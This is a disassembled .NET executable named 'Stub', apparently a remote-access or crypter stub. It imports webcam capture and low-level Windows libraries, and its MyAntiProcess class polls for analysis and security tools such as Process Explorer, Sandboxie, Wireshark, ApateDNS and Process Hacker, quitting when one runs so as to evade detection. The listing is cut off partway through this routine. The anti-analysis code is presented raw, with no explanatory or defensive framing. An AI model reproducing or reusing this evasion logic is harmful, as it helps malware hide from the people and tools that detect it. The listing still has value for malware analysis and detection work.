
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern kernel32
.module extern user32.dll
.module extern user32
.module extern avicap32.dll
.module extern winmm.dll
.module extern gdi32.dll
.module extern KERNEL32.DLL
.module extern gdi32
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly Stub
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module Stub.exe
// MVID: {02D2C26C-6945-40F6-983A-ADB6CDB82B16}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00300000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi beforefieldinit Stub.MyAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
    IL_0005:  stsfld     class j.OK Stub.MyAntiProcess::N
    IL_000a:  ret
  } // end of method MyAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MyAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed noinlining nooptimization
  {
    // Code size       741 (0x2e5)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process[] V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6,
             int32 V_7,
             class [System]System.Diagnostics.Process[] V_8,
             int32 V_9,
             class [System]System.Diagnostics.Process[] V_10,
             int32 V_11,
             class [System]System.Diagnostics.Process[] V_12,
             int32 V_13,
             class [System]System.Diagnostics.Process[] V_14,
             int32 V_15,
             class [System]System.Diagnostics.Process[] V_16,
             int32 V_17,
             class [System]System.Diagnostics.Process[] V_18,
             int32 V_19,
             class [System]System.Diagnostics.Process[] V_20,
             int32 V_21,
             class [System]System.Diagnostics.Process[] V_22,
             int32 V_23,
             class [System]System.Diagnostics.Process[] V_24,
             int32 V_25,
             class [System]System.Diagnostics.Process[] V_26,
             int32 V_27,
             class [System]System.Diagnostics.Process[] V_28,
             int32 V_29,
             class [System]System.Diagnostics.Process[] V_30,
             int32 V_31,
             class [System]System.Diagnostics.Process[] V_32,
             int32 V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35)
    IL_0000:  ldstr      "procexp"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.0
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_001c

    IL_000f:  ldloc.0
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  pop
    IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0018:  ldloc.1
    IL_0019:  ldc.i4.1
    IL_001a:  add.ovf
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldlen
    IL_001f:  conv.i4
    IL_0020:  blt.s      IL_000f

    IL_0022:  ldstr      "SbieCtrl"
    IL_0027:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_002c:  stloc.2
    IL_002d:  ldc.i4.0
    IL_002e:  stloc.3
    IL_002f:  br.s       IL_003e

    IL_0031:  ldloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldelem.ref
    IL_0034:  pop
    IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_003a:  ldloc.3
    IL_003b:  ldc.i4.1
    IL_003c:  add.ovf
    IL_003d:  stloc.3
    IL_003e:  ldloc.3
    IL_003f:  ldloc.2
    IL_0040:  ldlen
    IL_0041:  conv.i4
    IL_0042:  blt.s      IL_0031

    IL_0044:  ldstr      "SpyTheSpy"
    IL_0049:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_004e:  stloc.s    V_4
    IL_0050:  ldc.i4.0
    IL_0051:  stloc.s    V_5
    IL_0053:  br.s       IL_0066

    IL_0055:  ldloc.s    V_4
    IL_0057:  ldloc.s    V_5
    IL_0059:  ldelem.ref
    IL_005a:  pop
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0060:  ldloc.s    V_5
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.s    V_5
    IL_0066:  ldloc.s    V_5
    IL_0068:  ldloc.s    V_4
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0055

    IL_006e:  ldstr      "wireshark"
    IL_0073:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0078:  stloc.s    V_6
    IL_007a:  ldc.i4.0
    IL_007b:  stloc.s    V_7
    IL_007d:  br.s       IL_0090

    IL_007f:  ldloc.s    V_6
    IL_0081:  ldloc.s    V_7
    IL_0083:  ldelem.ref
    IL_0084:  pop
    IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008a:  ldloc.s    V_7
    IL_008c:  ldc.i4.1
    IL_008d:  add.ovf
    IL_008e:  stloc.s    V_7
    IL_0090:  ldloc.s    V_7
    IL_0092:  ldloc.s    V_6
    IL_0094:  ldlen
    IL_0095:  conv.i4
    IL_0096:  blt.s      IL_007f

    IL_0098:  ldstr      "apateDNS"
    IL_009d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a2:  stloc.s    V_8
    IL_00a4:  ldc.i4.0
    IL_00a5:  stloc.s    V_9
    IL_00a7:  br.s       IL_00ba

    IL_00a9:  ldloc.s    V_8
    IL_00ab:  ldloc.s    V_9
    IL_00ad:  ldelem.ref
    IL_00ae:  pop
    IL_00af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b4:  ldloc.s    V_9
    IL_00b6:  ldc.i4.1
    IL_00b7:  add.ovf
    IL_00b8:  stloc.s    V_9
    IL_00ba:  ldloc.s    V_9
    IL_00bc:  ldloc.s    V_8
    IL_00be:  ldlen
    IL_00bf:  conv.i4
    IL_00c0:  blt.s      IL_00a9

    IL_00c2:  ldstr      "IPBlocker"
    IL_00c7:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00cc:  stloc.s    V_10
    IL_00ce:  ldc.i4.0
    IL_00cf:  stloc.s    V_11
    IL_00d1:  br.s       IL_00e4

    IL_00d3:  ldloc.s    V_10
    IL_00d5:  ldloc.s    V_11
    IL_00d7:  ldelem.ref
    IL_00d8:  pop
    IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00de:  ldloc.s    V_11
    IL_00e0:  ldc.i4.1
    IL_00e1:  add.ovf
    IL_00e2:  stloc.s    V_11
    IL_00e4:  ldloc.s    V_11
    IL_00e6:  ldloc.s    V_10
    IL_00e8:  ldlen
    IL_00e9:  conv.i4
    IL_00ea:  blt.s      IL_00d3

    IL_00ec:  ldstr      "TiGeR-Firewall"
    IL_00f1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00f6:  stloc.s    V_12
    IL_00f8:  ldc.i4.0
    IL_00f9:  stloc.s    V_13
    IL_00fb:  br.s       IL_010e

    IL_00fd:  ldloc.s    V_12
    IL_00ff:  ldloc.s    V_13
    IL_0101:  ldelem.ref
    IL_0102:  pop
    IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0108:  ldloc.s    V_13
    IL_010a:  ldc.i4.1
    IL_010b:  add.ovf
    IL_010c:  stloc.s    V_13
    IL_010e:  ldloc.s    V_13
    IL_0110:  ldloc.s    V_12
    IL_0112:  ldlen
    IL_0113:  conv.i4
    IL_0114:  blt.s      IL_00fd

    IL_0116:  ldstr      "smsniff"
    IL_011b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0120:  stloc.s    V_14
    IL_0122:  ldc.i4.0
    IL_0123:  stloc.s    V_15
    IL_0125:  br.s       IL_0138

    IL_0127:  ldloc.s    V_14
    IL_0129:  ldloc.s    V_15
    IL_012b:  ldelem.ref
    IL_012c:  pop
    IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0132:  ldloc.s    V_15
    IL_0134:  ldc.i4.1
    IL_0135:  add.ovf
    IL_0136:  stloc.s    V_15
    IL_0138:  ldloc.s    V_15
    IL_013a:  ldloc.s    V_14
    IL_013c:  ldlen
    IL_013d:  conv.i4
    IL_013e:  blt.s      IL_0127

    IL_0140:  ldstr      "exeinfoPE"
    IL_0145:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014a:  stloc.s    V_16
    IL_014c:  ldc.i4.0
    IL_014d:  stloc.s    V_17
    IL_014f:  br.s       IL_0162

    IL_0151:  ldloc.s    V_16
    IL_0153:  ldloc.s    V_17
    IL_0155:  ldelem.ref
    IL_0156:  pop
    IL_0157:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_015c:  ldloc.s    V_17
    IL_015e:  ldc.i4.1
    IL_015f:  add.ovf
    IL_0160:  stloc.s    V_17
    IL_0162:  ldloc.s    V_17
    IL_0164:  ldloc.s    V_16
    IL_0166:  ldlen
    IL_0167:  conv.i4
    IL_0168:  blt.s      IL_0151

    IL_016a:  ldstr      "NetSnifferCs"
    IL_016f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0174:  stloc.s    V_18
    IL_0176:  ldc.i4.0
    IL_0177:  stloc.s    V_19
    IL_0179:  br.s       IL_018c

    IL_017b:  ldloc.s    V_18
    IL_017d:  ldloc.s    V_19
    IL_017f:  ldelem.ref
    IL_0180:  pop
    IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0186:  ldloc.s    V_19
    IL_0188:  ldc.i4.1
    IL_0189:  add.ovf
    IL_018a:  stloc.s    V_19
    IL_018c:  ldloc.s    V_19
    IL_018e:  ldloc.s    V_18
    IL_0190:  ldlen
    IL_0191:  conv.i4
    IL_0192:  blt.s      IL_017b

    IL_0194:  ldstr      "Sandboxie Control"
    IL_0199:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_019e:  stloc.s    V_20
    IL_01a0:  ldc.i4.0
    IL_01a1:  stloc.s    V_21
    IL_01a3:  br.s       IL_01b6

    IL_01a5:  ldloc.s    V_20
    IL_01a7:  ldloc.s    V_21
    IL_01a9:  ldelem.ref
    IL_01aa:  pop
    IL_01ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b0:  ldloc.s    V_21
    IL_01b2:  ldc.i4.1
    IL_01b3:  add.ovf
    IL_01b4:  stloc.s    V_21
    IL_01b6:  ldloc.s    V_21
    IL_01b8:  ldloc.s    V_20
    IL_01ba:  ldlen
    IL_01bb:  conv.i4
    IL_01bc:  blt.s      IL_01a5

    IL_01be:  ldstr      "processhacker"
    IL_01c3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01c8:  stloc.s    V_22
    IL_01ca:  ldc.i4.0
    IL_01cb:  stloc.s    V_23
    IL_01cd:  br.s       IL_01e0

    IL_01cf:  ldloc.s    V_22
    IL_01d1:  ldloc.s    V_23
    IL_01d3:  ldelem.ref
    IL_01d4:  pop
    IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01da:  ldloc.s    V_23
    IL_01dc:  ldc.i4.1
    IL_01dd:  add.ovf
